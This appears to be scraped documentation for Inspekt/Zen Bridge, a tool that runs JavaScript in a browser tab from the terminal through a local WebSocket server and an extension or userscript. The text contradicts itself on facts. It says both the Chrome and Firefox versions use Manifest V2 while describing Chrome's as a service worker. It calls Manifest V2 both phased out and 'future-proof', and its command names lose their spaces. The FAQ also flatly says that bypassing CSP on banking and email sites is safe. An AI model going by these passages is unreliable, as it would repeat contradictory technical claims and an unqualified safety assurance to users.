docs.title: CSP Still Blocking?
docs.text:
If you're still seeing CSP errors:

  1. Verify extension is active:
  2. Go to about:debugging#/runtime/this-firefox/
  3. Make sure Inspekt is enabled

  4. Check that it has all required permissions

  5. Check permissions:

  6. The extension needs activeTab, scripting, and <all_urls> permissions

  7. If prompted, click "Allow" for all permissions

  8. Reload the page:

  9. The content script loads when the page loads
  10. Try refreshing the page after enabling the extension

docs.title: "Service worker (inactive)" Warning
docs.text: This is normal! Chrome's Manifest V2 background scripts sleep when not in use to save resources. They wake up automatically when needed.

docs.title: Still Not Working?
docs.text:
1. Check Troubleshooting Guide
  2. Open an issue: https://github.com/roelvangils/inspekt/issues

Content Script: - Open DevTools on any page (F12) - Check the Console tab for Inspekt messages

Popup: - Right-click the ⚡ icon → "Inspect popup" - This opens DevTools for the popup

docs.title: Differences from Firefox Extension
docs.text:
The Chrome extension uses Manifest V2 while Firefox uses Manifest V2:

Feature Firefox (Manifest V2) Chrome (Manifest V2) Background Persistent background page Service worker (event-driven) API Namespace browser.* chrome.* Script Execution tabs.executeScript() tabs.executeScript() Permissions Combined in permissions Split into permissions and host_permissions

Both versions provide the same functionality and CSP bypass capabilities.

docs.title: FAQ
docs.text:
Q: Why an extension instead of just a userscript? A: Userscripts are blocked by CSP on many important sites (GitHub, Gmail, banking). Extensions have elevated privileges and can bypass CSP.

Q: Is it safe to bypass CSP? A: Yes! Browser extensions are designed to have elevated privileges. CSP restrictions apply to web content, not to trusted browser extensions.

Q: Why Manifest V2? A: Chrome is phasing out Manifest V2 extensions. Manifest V2 is the future-proof standard for Chrome extensions.

Q: Will this work on Edge, Brave, or other Chromium browsers? A: Yes! This extension should work on any Chromium-based browser (Edge, Brave, Opera, Vivaldi, etc.). Just load it in developer mode.

Q: Can I use both userscript and extension? A: It's recommended to use only one at a time to avoid conflicts. The extension is the better choice for compatibility.

Q: When will it be on Chrome Web Store? A: We're preparing for submission! See CHROME_WEB_STORE.md for our publication roadmap and how you can help.

docs.title: Permanent Installation Guide
docs.text: This guide explains how to install the Inspekt extension permanently in Firefox.

docs.title: Quick Answer
docs.text:
For regular Firefox users: The easiest way is to reload the temporary extension each time you restart Firefox (Method 1 below). We're working on submitting to the Firefox Add-ons store for one-click permanent installation.

For developers: Use Firefox Developer Edition with unsigned extensions enabled (Method 2 below).

docs.title: Method 1: Temporary Installation (Easiest)
docs.text:
Pros: - No special setup required - Works with regular Firefox - Perfect for testing and development

Cons: - Needs to be reloaded after Firefox restarts

docs.title: Steps:
docs.text:
1. Navigate to about:debugging#/runtime/this-firefox
  2. Click "Load Temporary Add-on..."
  3. Select manifest.json from the extensions/firefox/ directory

Note: You'll need to repeat these steps each time you restart Firefox.

docs.title: Method 2: Self-Hosted Unsigned Extension (Developer Edition/Nightly)
docs.text:
Pros: - Permanent installation - No signing required - Full control

Cons: - Requires Firefox Developer Edition or Nightly - Need to disable signature verification

docs.title: 2.1 Install Firefox Developer Edition or Nightly
docs.text: Download one of these: - Firefox Developer Edition: https://www.mozilla.org/firefox/developer/ - Firefox Nightly: https://www.mozilla.org/firefox/nightly/

docs.title: 2.2 Build the Extension
docs.text:
cd extensions/firefox
./build.sh

This creates build/zen-browser-bridge-4.0.0.xpi

docs.title: 2.3 Disable Signature Verification
docs.text:
1. Open Firefox Developer Edition/Nightly
  2. Navigate to about:config
  3. Accept the risk warning
  4. Search for xpinstall.signatures.required
  5. Set it to false (double-click to toggle)

docs.title: 2.4 Install the Extension
docs.text:
Option A: Drag and Drop 1. Open Firefox 2. Drag build/zen-browser-bridge-4.0.0.xpi into Firefox window 3. Click "Add" when prompted

Option B: File Picker 1. Navigate to about:addons 2. Click the gear icon (⚙️) 3. Select "Install Add-on From File..." 4. Choose build/zen-browser-bridge-4.0.0.xpi 5. Click "Add" when prompted

The extension is now permanently installed!

docs.title: Method 3: Web Extension Signing (Recommended for Distribution)
docs.text:
Pros: - Works with regular Firefox - Permanent installation - Can be shared with others - Most secure method

Cons: - Requires Mozilla Developer account - Takes time for review (if distributing publicly)

docs.title: 3.1 Get a Mozilla Add-on Developer Account
docs.text:
1. Go to https://addons.mozilla.org/developers/
  2. Sign in with Firefox Account (or create one)
  3. Agree to the Developer Agreement

docs.title: 3.2 Build the Extension
docs.text:
cd extensions/firefox
./build.sh

This creates build/zen-browser-bridge-4.0.0.zip

docs.title: 3.3 Option A: Self-Distribution (Unlisted)
docs.text:
Use this if you want to host the extension yourself (not on the store):

  1. Go to https://addons.mozilla.org/developers/addon/submit/upload-unlisted
  2. Upload build/zen-browser-bridge-4.0.0.zip
  3. Wait for automated validation (usually instant)
  4. Download the signed .xpi file
  5. Distribute the signed .xpi to users

Advantages: - No review process - Fast (usually minutes) - Can distribute via your own website/GitHub

How users install: - Users download the signed .xpi - Drag and drop into Firefox - Extension stays permanently installed

docs.title: 3.4 Option B: Firefox Add-ons Store (Listed)
docs.text:
Use this for public distribution on the official store:

  1. Go to https://addons.mozilla.org/developers/addon/submit/distribution
  2. Choose "On this site" (listed)
  3. Upload build/zen-browser-bridge-4.0.0.zip
  4. Fill out listing information:
  5. Name: Inspekt
  6. Summary: Execute JavaScript in your browser from the command line
  7. Categories: Developer Tools
  8. Support email/website
  9. Submit for review

Review process: - Mozilla reviews the extension (can take days to weeks) - Once approved, it appears on addons.mozilla.org - Users can install with one click

Advantages: - Maximum visibility and trust - One-click installation for users - Automatic updates

docs.title: Method 4: Use web-ext for Development
docs.text: Best for: Active development and testing

docs.title: 4.1 Install web-ext
docs.text:
npm install -g web-ext

Or use npx (no installation needed): 

npx web-ext --version

docs.title: 4.2 Run Extension in Temporary Profile
docs.text:
cd extensions/firefox
web-ext run

This opens a new Firefox window with the extension loaded.

docs.title: 4.3 Run with Your Firefox Profile
docs.text: web-ext run --firefox-profile=/path/to/profile

docs.title: 4.4 Build and Sign
docs.text:
# Build
web-ext build

# Sign (requires API credentials)
web-ext sign --api-key=your-key --api-secret=your-secret

Get API credentials: 1. Go to https://addons.mozilla.org/developers/addon/api/key/ 2. Generate API credentials 3. Use them with web-ext

docs.title: Comparison Table
docs.text: Method Permanent Regular Firefox Setup Complexity Best For Temporary ❌ No ✅ Yes ⭐ Easy Testing, quick use Unsigned (Dev Edition) ✅ Yes ❌ No ⭐⭐ Medium Development Self-Signed (Unlisted) ✅ Yes ✅ Yes ⭐⭐⭐ Medium Self-distribution Store (Listed) ✅ Yes ✅ Yes ⭐⭐⭐⭐ Hard Public distribution web-ext ❌ Temporary ✅ Yes ⭐⭐ Medium Active development

docs.title: For Personal Use
docs.text: → Method 2 (Unsigned) with Firefox Developer Edition - One-time setup, permanent installation - No review process

docs.title: For Sharing with Friends/Team
docs.text: → Method 3A (Self-Signed Unlisted) - Fast signing (minutes) - Share the signed .xpi file - Works on regular Firefox

docs.title: For Public Release
docs.text: → Method 3B (Store Listed) - Maximum trust and visibility - Users can find it by searching - Automatic updates

docs.title: "This add-on could not be installed because it appears to be corrupt"
docs.text: Solution: Make sure you're using Firefox Developer Edition/Nightly with signature verification disabled, or use a signed .xpi file.

docs.title: "Install Add-on From File" is greyed out
docs.text: Solution: This feature requires Firefox Developer Edition, Beta, Nightly, or ESR. It's disabled in regular Firefox for security.

docs.title: Extension disappears after Firefox restart (Temporary Installation)
docs.text: Solution: This is expected behavior. Use Method 2 or 3 for permanent installation.

docs.title: Signature verification setting doesn't persist
docs.text: Solution: - This is only supported in Developer Edition and Nightly - Regular Firefox doesn't allow disabling signature verification - Use signed extensions instead

docs.title: Configuration
docs.text: Customize Inspekt for your specific workflow with comprehensive configuration options. This guide covers everything from basic settings to advanced control mode customization.

docs.title: Configuration File Location
docs.text:
Zen Bridge uses a JSON configuration file:

config.json

The file is located in the project root directory where you installed Zen Bridge.

Create Config File

If config.json doesn't exist, create it in the project root: 

cd /path/to/zen-bridge
touch config.json

docs.title: Configuration Structure
docs.text:
The configuration file has two main sections:

  1. ai-language - Language for AI operations (summarize, describe)
  2. control - Keyboard control mode settings

docs.title: Complete Default Configuration
docs.text:
{
  "ai-language": "auto",
  "control": {
    "auto-refocus": "only-spa",
    "focus-outline": "custom",
    "speak-name": false,
    "speak-all": true,
    "announce-role": false,
    "announce-on-page-load": false,
    "navigation-wrap": true,
    "scroll-on-focus": true,
    "click-delay": 0,
    "focus-color": "#0066ff",
    "focus-size": 3,
    "focus-animation": true,
    "focus-glow": true,
    "sound-on-focus": "none",
    "selector-strategy": "id-first",
    "refocus-timeout": 2000,
    "verbose": true,
    "verbose-logging": false
  }
}

docs.title: ai-language
docs.text:
Controls the language used for AI-powered features (inspektsummarize and inspektdescribe).

Type: string Default: "auto" Options: "auto", "en", "nl", "fr", "de", "es", etc.

Auto-detect (Default)Fixed LanguageMultiple Languages 
{
  "ai-language": "auto"
}

Automatically detects the page language and uses it for AI operations.

{
  "ai-language": "en"
}

Always use English for AI operations, regardless of page language.

{
  "ai-language": "nl"
}

Use Dutch for summaries and descriptions.

Supported Languages: Any language code supported by your AI provider (mods).

Requires mods

AI features require mods to be installed. The language setting is passed to the AI model in the prompt.

docs.title: Control Mode Configuration
docs.text: The control section customizes keyboard navigation behavior when using inspektcontrol.

docs.title: auto-refocus
docs.text:
When to automatically refocus the previously focused element after page navigation.

Type: "always" | "only-spa" | "never" Default: "only-spa"

only-spa (Default)alwaysnever 
{
  "control": {
    "auto-refocus": "only-spa"
  }
}

Only refocus on Single Page Applications (SPAs) where the URL changes without a full page reload.

Use case: Modern web apps like Gmail, Twitter, GitHub.

{
  "control": {
    "auto-refocus": "always"
  }
}

Always try to refocus after any page change, including full page reloads.

Use case: Aggressive refocus behavior for maximum continuity.

{
  "control": {
    "auto-refocus": "never"
  }
}

Never automatically refocus. Focus returns to <body> after navigation.

Use case: You prefer manual navigation from the top of each page.

docs.title: refocus-timeout
docs.text:
Maximum time to wait for refocus operation to complete.

Type: number (milliseconds) Default: 2000 Range: 100 - 10000

{
  "control": {
    "refocus-timeout": 2000
  }
}

Increase for slow-loading pages, decrease for faster feedback.

docs.title: focus-outline
docs.text:
Visual style for focused elements.

Type: "custom" | "original" | "none" Default: "custom"

custom (Default)originalnone 
{
  "control": {
    "focus-outline": "custom"
  }
}

Use Zen Bridge's custom blue outline with glow effect.

{
  "control": {
    "focus-outline": "original"
  }
}

Keep the browser's default focus outline.

{
  "control": {
    "focus-outline": "none"
  }
}

No focus outline (not recommended for accessibility).

docs.title: focus-color
docs.text:
Color of the custom focus outline.

Type: string (CSS color) Default: "#0066ff"

{
  "control": {
    "focus-color": "#ff6600"
  }
}

Examples:

  • "#0066ff" - Blue (default)
  • "#ff0000" - Red
  • "rgb(255, 0, 0)" - Red (RGB)
  • "orange" - Orange (named color)

docs.title: focus-size
docs.text:
Width of the focus outline in pixels.

Type: number (pixels) Default: 3 Range: 1 - 10

{
  "control": {
    "focus-size": 5
  }
}

Larger values create more prominent outlines.

docs.title: focus-animation
docs.text:
Enable animated focus transitions.

Type: boolean Default: true

{
  "control": {
    "focus-animation": true
  }
}

Smooth fade-in effect when focus changes.

docs.title: focus-glow
docs.text:
Enable glow effect around focused elements.

Type: boolean Default: true

{
  "control": {
    "focus-glow": true
  }
}

Adds a soft glow shadow for better visibility.

docs.title: navigation-wrap
docs.text:
Whether navigation wraps from last element to first (and vice versa).

Type: boolean Default: true

{
  "control": {
    "navigation-wrap": true
  }
}

When true, pressing Tab on the last focusable element jumps to the first.

docs.title: scroll-on-focus
docs.text:
Automatically scroll focused elements into view.

Type: boolean Default: true

{
  "control": {
    "scroll-on-focus": true
  }
}

Ensures focused elements are always visible.

docs.title: click-delay
docs.text:
Delay before executing click actions (in milliseconds).

Type: number (milliseconds) Default: 0 Range: 0 - 5000

{
  "control": {
    "click-delay": 100
  }
}

Useful if pages need time to settle before clicks.

docs.title: sound-on-focus
docs.text:
Play a sound when focus changes.

Type: "none" | "beep" | "click" | "subtle" Default: "none"

none (Default)beepclicksubtle 
{
  "control": {
    "sound-on-focus": "none"
  }
}

No sound effects.

{
  "control": {
    "sound-on-focus": "beep"
  }
}

Short beep on focus change.

{
  "control": {
    "sound-on-focus": "click"
  }
}

Click sound on focus change.

{
  "control": {
    "sound-on-focus": "subtle"
  }
}

Subtle tone on focus change.

Browser Support

Sound effects require browser support for the Web Audio API.

docs.title: speak-all
docs.text:
Speak all terminal output via text-to-speech (macOS only).

Type: boolean Default: true

{
  "control": {
    "speak-all": true
  }
}

Uses macOS say command to read terminal messages aloud.

docs.title: speak-name
docs.text:
Speak element name when focused.

Type: boolean Default: false

{
  "control": {
    "speak-name": true
  }
}

Announces accessible name of focused element (from aria-label, text content, etc.).

docs.title: announce-role
docs.text:
Announce element role (button, link, heading, etc.).

Type: boolean Default: false

{
  "control": {
    "announce-role": true
  }
}

Example: "Submit button" instead of just "Submit".

docs.title: announce-on-page-load
docs.text:
Announce page title when a new page loads.

Type: boolean Default: false

{
  "control": {
    "announce-on-page-load": true
  }
}

Helps orient you when navigating between pages.

docs.title: selector-strategy
docs.text:
Strategy for generating element selectors for refocus operations.

Type: "id-first" | "aria-first" | "css-first" Default: "id-first"

id-first (Default)aria-firstcss-first 
{
  "control": {
    "selector-strategy": "id-first"
  }
}

Prefer id attributes, fall back to ARIA, then CSS selectors.

Best for: Most web pages with proper IDs.

{
  "control": {
    "selector-strategy": "aria-first"
  }
}

Prefer ARIA labels, fall back to ID, then CSS.

Best for: Accessibility-focused applications.

{
  "control": {
    "selector-strategy": "css-first"
  }
}

Use CSS selectors based on tag/class/structure.

Best for: Pages with dynamic IDs.

docs.title: verbose
docs.text:
Show detailed terminal announcements during control mode.

Type: boolean Default: true

{
  "control": {
    "verbose": true
  }
}

When true, prints messages like "Focused: Submit button" to the terminal.

docs.title: verbose-logging
docs.text:
Enable verbose logging in the browser console.

Type: boolean Default: false

{
  "control": {
    "verbose-logging": true
  }
}

Useful for debugging control mode behavior. Check browser DevTools console.

docs.title: Minimal Configuration
docs.text:
For users who just want AI in a different language:

{
  "ai-language": "nl"
}

All control settings use defaults.

docs.title: Accessibility-Focused Configuration
docs.text:
For users relying on screen readers and audio feedback:

{
  "ai-language": "en",
  "control": {
    "auto-refocus": "always",
    "speak-all": true,
    "speak-name": true,
    "announce-role": true,
    "announce-on-page-load": true,
    "sound-on-focus": "subtle",
    "verbose": true,
    "selector-strategy": "aria-first"
  }
}

docs.title: Performance-Optimized Configuration
docs.text:
Minimal visual effects for faster performance:

{
  "ai-language": "auto",
  "control": {
    "focus-animation": false,
    "focus-glow": false,
    "scroll-on-focus": false,
    "speak-all": false,
    "verbose": false,
    "verbose-logging": false
  }
}

docs.title: High-Contrast Configuration
docs.text:
Enhanced visibility with bold outlines:

{
  "ai-language": "auto",
  "control": {
    "focus-outline": "custom",
    "focus-color": "#ffff00",
    "focus-size": 5,
    "focus-animation": true,
    "focus-glow": true
  }
}

docs.title: Developer/Debug Configuration
docs.text:
Maximum logging and visibility:

{
  "ai-language": "auto",
  "control": {
    "auto-refocus": "always",
    "verbose": true,
    "verbose-logging": true,
    "refocus-timeout": 5000,
    "focus-color": "#ff00ff",
    "focus-size": 4
  }
}

docs.title: Reload Configuration
docs.text:
Configuration is loaded when:

  1. Server starts - inspektserver start
  2. Control mode starts - inspektcontrol

To apply changes:

Restart Control ModeRestart Server 
# Press 'q' in control mode to quit, then restart
inspektcontrol

inspektserver stop
inspektserver start --daemon

Live Reload

Control mode configuration is sent to the browser when you start inspektcontrol, so you just need to quit and restart control mode to apply changes.

docs.title: Customizing AI Prompts
docs.text: AI prompts are stored in separate files for easy customization:

docs.title: Summary Prompt
docs.text:
Location: prompts/summary.prompt

Edit this file to change how articles are summarized:

Provide a concise, structured summary of the following article.
Focus on the main points and key takeaways.

Article content:
{content}

docs.title: Description Prompt
docs.text:
Location: prompts/describe.prompt

Edit this file to change how pages are described:

Describe this webpage in a way that would be helpful for someone
using a screen reader. Focus on navigation, main content, and structure.

Page structure:
{content}

Variables available: {content}, {url}, {title}, {language}

docs.title: Configuration Hierarchy
docs.text:
Configuration is loaded in the following order (later values override earlier ones):

  1. Default values (hardcoded in zen/domain/models.py)
  2. config.json (project root)
  3. Command-line flags (where applicable)

Example:

# Default verbose=true, but config.json sets verbose=false
# Result: verbose=false

# But if you pass a flag:
inspektcontrol --verbose
# Result: verbose=true (flag overrides config)

No CLI Flags for Config

Currently, Zen Bridge doesn't support command-line flags for most configuration options. Edit config.json to customize behavior.

docs.title: Configuration Not Loading
docs.text:
Problem: Changes to config.json don't seem to apply.

Solutions:

  1. Check JSON syntax: 

    # Validate JSON
python3 -c "import json; json.load(open('config.json'))"

  2. Check file location: 

    # Ensure config.json is in project root
ls -la config.json

  3. Restart server and control mode: 

    inspektserver stop
inspektserver start --daemon
inspektcontrol

docs.title: Invalid Configuration Value
docs.text:
Problem: Server or control mode fails to start.

Solution: Check for invalid values:

  • auto-refocus: Must be "always", "only-spa", or "never"
  • focus-outline: Must be "custom", "original", or "none"
  • sound-on-focus: Must be "none", "beep", "click", or "subtle"
  • selector-strategy: Must be "id-first", "aria-first", or "css-first"
  • refocus-timeout: Must be number >= 100
  • focus-size: Must be number >= 1

docs.title: Configuration Ignored
docs.text:
Problem: Some settings don't seem to work.

Check:

  1. Feature support: Some features (like TTS) only work on macOS
  2. Browser compatibility: Sound effects require Web Audio API
  3. Spelling: JSON keys are case-sensitive and use hyphens

docs.title: Advanced: Programmatic Configuration
docs.text:
You can load and validate configuration programmatically:

from zen.domain.models import ZenConfig

# Load from file
with open('config.json') as f:
    config_dict = json.load(f)

# Validate with Pydantic
config = ZenConfig(**config_dict)

# Access settings
print(config.ai_language)  # "auto"
print(config.control.auto_refocus)  # "only-spa"
print(config.control.focus_color)  # "#0066ff"

This is useful for building extensions or integrating Zen Bridge into other tools.

docs.title: Configuration Reference
docs.text:
Quick reference for all available settings:

Setting Type Default Description ai-language string "auto" Language for AI operations control.auto-refocus string "only-spa" When to auto-refocus control.focus-outline string "custom" Focus outline style control.speak-name boolean false Speak element name control.speak-all boolean true Speak all terminal output control.announce-role boolean false Announce element role control.announce-on-page-load boolean false Announce page title on load control.navigation-wrap boolean true Wrap navigation at end control.scroll-on-focus boolean true Scroll to focused element control.click-delay number 0 Delay before clicks (ms) control.focus-color string "#0066ff" Focus outline color control.focus-size number 3 Focus outline width (px) control.focus-animation boolean true Animate focus transitions control.focus-glow boolean true Add glow effect control.sound-on-focus string "none" Sound on focus change control.selector-strategy string "id-first" Element selector strategy control.refocus-timeout number 2000 Refocus timeout (ms) control.verbose boolean true Terminal announcements control.verbose-logging boolean false Browser console logging

docs.title: Installation
docs.text: This comprehensive guide will walk you through installing Inspekt on your system, from installing Python dependencies to setting up the browser userscript and verifying everything works correctly.

docs.title: Installation Flow
docs.text:
flowchart LR
    A[Install CLI] --> B[Install Userscript]
    B --> C[Start Server]
    C --> D[Test Connection]
    D --> E[Ready!]

    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
    style D fill:#fff9e6
    style E fill:#e1ffe1

docs.title: Requirements
docs.text:
Before you begin, ensure you have the following:

  • Python 3.11 or higher - Check your version with python --version or python3 --version
  • pip - Python package manager (usually included with Python)
  • A modern browser - Chrome, Firefox, Edge, Safari, or any Chromium-based browser
  • A userscript manager extension - We'll install this in the browser setup step

Python Version Check

Run python3 --version to check your Python version. If you have Python 3.10 or lower, you'll need to upgrade to Python 3.11 or higher.

macOSUbuntu/DebianWindows 
# Using Homebrew
brew install python@3.11

sudo apt update
sudo apt install python3.11 python3.11-pip

Download from python.org and install Python 3.11+

docs.title: Step 1: Install the CLI Tool
docs.text:
You can install Inspekt from source (recommended for development) or via pip (when available).

From Source (Recommended)Install Dependencies ManuallyFor Development

Clone the repository and install in development mode:

# Clone the repository
git clone https://github.com/roelvangils/inspekt.git
cd inspekt

# Install in development mode
pip install -e .

This installs the zen command and all dependencies. The -e flag means "editable" - changes to the source code will be reflected immediately.

If you prefer to manage dependencies yourself:

# Clone the repository
git clone https://github.com/roelvangils/inspekt.git
cd inspekt

# Install dependencies
pip install -r requirements.txt

If you plan to contribute or run tests:

# Clone the repository
git clone https://github.com/roelvangils/inspekt.git
cd inspekt

# Install with dev dependencies
pip install -e ".[dev]"

This includes testing tools (pytest, playwright), linters (ruff), and type checkers (mypy).

docs.title: Verify the Installation
docs.text:
After installation, verify the zen command is available:

inspekt--version

You should see output like:

Inspekt v2.0.0

Run the help command to see available commands:

inspekt--help

Installation Complete

The CLI tool is now installed! Next, we'll set up the browser connection.

docs.title: Step 2: Install the Browser Component
docs.text:
The browser needs a component to receive commands from the CLI and establish a WebSocket connection to the server.

Choose one installation method:

  • Extension (Recommended) - Works on ALL websites including GitHub, Gmail, banking sites. Bypasses CSP restrictions.
  • Userscript (Quick Setup) - One-click installation, but may be blocked by CSP on some sites.

docs.title: Extension Installation
docs.text: The Firefox extension provides full compatibility with all websites, including those with strict Content Security Policy (CSP) like GitHub, Gmail, and banking sites.

docs.title: 2.1a Install Firefox Extension
docs.text:
1. Download the extension files from the repository: 

    cd /path/to/inspekt
cd extensions/firefox

  2. Open Firefox and navigate to: 

    about:debugging#/runtime/this-firefox

  3. Load the extension:

  4. Click "Load Temporary Add-on..."

  5. Select the manifest.json file from extensions/firefox/

  6. Verify installation:

  7. Look for the ⚡ icon in your toolbar
  8. Click it to see the status panel

Extension Installed

The extension will now work on all websites! Continue to Step 3: Start the Bridge Server.

Why Use the Extension?

The extension bypasses Content Security Policy (CSP) restrictions that block the userscript on important sites:

  • ✅ Works on GitHub, Gmail, banking sites
  • ✅ Built-in settings panel with connection status
  • ✅ No CSP limitations

Read more about extensions →

docs.title: Userscript Installation
docs.text: The userscript is quick to install but may be blocked by CSP on some websites. If you encounter issues on GitHub, Gmail, or banking sites, use the extension instead.

docs.title: 2.1b Install a Userscript Manager
docs.text:
First, install a userscript manager extension in your browser:

Violentmonkey (Recommended)TampermonkeyGreasemonkey (Firefox only)

Best compatibility and open source.

  • Chrome/Edge
  • Firefox
  • Safari

Popular alternative with many features.

  • Chrome/Edge
  • Firefox
  • Safari

Classic Firefox userscript manager.

  • Firefox

Browser Compatibility

Zen Bridge works with any browser that supports userscript managers and WebSockets. This includes all modern browsers.

CSP Limitations

The userscript may be blocked by Content Security Policy on sites like:

  • GitHub, GitLab
  • Gmail, Outlook
  • Banking and government sites

If you encounter CSP issues, use the Firefox extension instead for full compatibility.

Read CSP troubleshooting guide →

docs.title: 2.2b Get the Userscript Code
docs.text:
Display the userscript code using the CLI:

inspektuserscript

This will output the complete userscript code to your terminal. The userscript is located at /Users/roelvangils/zen_bridge/userscript_ws.js in the repository.

docs.title: 2.3b Create the Userscript
docs.text:
Now create a new userscript in your userscript manager:

  1. Click the userscript manager icon in your browser toolbar
  2. Create a new script (usually a "+" or "New Script" button)
  3. Delete any default content in the editor
  4. Paste the userscript code from the inspektuserscript command
  5. Save the script (usually Ctrl+S or Cmd+S)

The userscript will automatically enable itself.

Quick Copy

To copy the userscript to your clipboard (macOS): 

inspektuserscript | pbcopy

Or save it to a file: 

inspektuserscript > my-userscript.js

docs.title: 2.4b Verify Userscript is Active
docs.text:
To verify the userscript is running:

  1. Open your browser's Developer Console (F12 or Cmd+Option+I)
  2. Look for a message like: "Zen Bridge userscript loaded"
  3. Check that the userscript manager shows the script as enabled

Userscript Scope

By default, the userscript runs on all pages (@match *://*/*). If you want to restrict it to specific domains, edit the @match line in the userscript.

docs.title: Step 3: Start the Bridge Server
docs.text: The bridge server acts as a middleman between the CLI and browser, managing WebSocket connections and HTTP endpoints.

docs.title: 3.1 Start the Server
docs.text:
You can start the server in foreground or background mode:

Background Mode (Daemon)Foreground Mode

Recommended for normal use:

inspektserver start --daemon

The server runs in the background. You can close your terminal and it will keep running.

Check server status: 

inspektserver status

Stop the server: 

inspektserver stop

Useful for debugging:

inspektserver start

The server runs in the foreground with live log output. Press Ctrl+C to stop.

Example output: 

Starting Zen Bridge WebSocket server...
HTTP API server: http://127.0.0.1:8765
WebSocket server: ws://127.0.0.1:8766
Server is ready! Waiting for browser connections...

docs.title: 3.2 Server Ports
docs.text:
The server uses two ports:

  • HTTP API: http://127.0.0.1:8765 - CLI communicates with this
  • WebSocket: ws://127.0.0.1:8766 - Browser connects to this

Port Configuration

The ports are currently hardcoded. If you need to change them, you'll need to modify the server configuration and userscript.

docs.title: 3.3 Verify Server is Running
docs.text:
Check the server status:

inspektserver status

Expected output when running:

✓ Server is running
  PID: 12345
  HTTP API: http://127.0.0.1:8765
  WebSocket: ws://127.0.0.1:8766
  Connected browsers: 0
  Uptime: 2 minutes

docs.title: Step 4: Verify the Complete Setup
docs.text: Now let's verify that everything is working together:

docs.title: 4.1 Open a Browser Tab
docs.text:
1. Open your browser (with the userscript manager and userscript installed)
  2. Navigate to any website, for example: https://example.com
  3. Keep the tab active (the userscript only works in active tabs)

docs.title: 4.2 Check Browser Connection
docs.text:
In the browser's Developer Console (F12), you should see:

Zen Bridge userscript loaded
Connected to Zen Bridge WebSocket server

docs.title: 4.3 Execute a Test Command
docs.text:
From your terminal, run a simple command:

inspekteval "document.title"

Expected output:

Example Domain

If you see the page title, congratulations! Everything is working correctly.

Connection Successful!

Your terminal is now connected to your browser. You can execute JavaScript directly in the active tab!

docs.title: 4.4 Try More Commands
docs.text:
# Get page information
inspektinfo

# Get the current URL
inspekteval "location.href"

# Count links on the page
inspekteval "document.querySelectorAll('a').length"

# Start interactive REPL
inspektrepl

Setup Complete!

You've successfully installed Inspekt! Check out the Quick Start Guide for a hands-on tutorial.

docs.title: "zen: command not found"
docs.text:
Problem: The zen command is not in your PATH.

Solutions:

Check InstallationUpdate PATHUse python -m 
# Verify installation
pip show inspekt

# Reinstall if needed
pip install -e .

# Find where pip installs scripts
python3 -m site --user-base

# Add to PATH (add to ~/.bashrc or ~/.zshrc)
export PATH="$PATH:$(python3 -m site --user-base)/bin"

# Run as a module instead
python3 -m zen.cli --help

docs.title: "Bridge server is not running"
docs.text:
Problem: The CLI cannot connect to the server.

Solutions:

  1. Start the server: 

    inspektserver start --daemon

  2. Check if server is running: 

    inspektserver status

  3. Restart the server: 

    inspektserver stop
inspektserver start --daemon

  4. Check for port conflicts: 

    # Check if ports 8765 or 8766 are in use
lsof -i :8765
lsof -i :8766

docs.title: "No response from browser"
docs.text:
Problem: The browser is not connected to the WebSocket server.

Solutions:

  1. Verify userscript is installed and enabled
  2. Check userscript manager icon

  3. Ensure script is enabled

  4. Check browser console for errors

  5. Open DevTools (F12)
  6. Look for WebSocket connection errors

  7. Ensure you see "Connected to Zen Bridge WebSocket server"

  8. Ensure tab is active

  9. The userscript only works in the currently active browser tab

  10. Switch to the tab and try again

  11. Restart everything: 

    # Stop server
inspektserver stop

# Restart browser (to reload userscript)

# Start server
inspektserver start --daemon

  12. Check WebSocket connection manually

  13. In browser console, run: 
    ws = new WebSocket('ws://127.0.0.1:8766')
ws.onopen = () => console.log('Connected!')

docs.title: Command Timeout
docs.text:
Problem: Commands hang or timeout.

Solutions:

  1. Increase timeout: 

    inspekteval "slow_operation()" --timeout 30

  2. Check if tab is active:

  3. Inactive tabs may throttle JavaScript execution

  4. Switch to the tab and try again

  5. Check for JavaScript errors:

  6. Open browser console
  7. Look for errors when command executes

docs.title: WebSocket Connection Refused
docs.text:
Problem: Browser cannot connect to WebSocket server.

Solutions:

  1. Verify server is running: 

    inspektserver status

  2. Check firewall settings:

  3. Ensure localhost connections are allowed

  4. Port 8766 must be accessible

  5. Try a different port (requires code modification):

  6. Edit server configuration
  7. Update userscript to match

docs.title: Python Version Issues
docs.text:
Problem: Zen Bridge requires Python 3.11+, but you have an older version.

Solution: Upgrade Python:

macOS (Homebrew)Ubuntu/DebianWindows 
brew install python@3.11
# Update PATH in ~/.zshrc or ~/.bashrc
export PATH="/usr/local/opt/python@3.11/bin:$PATH"

sudo apt update
sudo apt install python3.11 python3.11-pip
# Use python3.11 explicitly
python3.11 -m pip install -e .

Download and install from python.org

docs.title: Uninstallation
docs.text: To uninstall Inspekt:

docs.title: 1. Stop the Server
docs.text: inspektserver stop

docs.title: 2. Uninstall the Package
docs.text:
# If installed with pip
pip uninstall inspekt

# If installed from source, just delete the directory
rm -rf ~/inspekt

docs.title: 3. Remove Browser Userscript
docs.text:
1. Click userscript manager icon
  2. Find "Zen Bridge" script
  3. Delete or disable the script
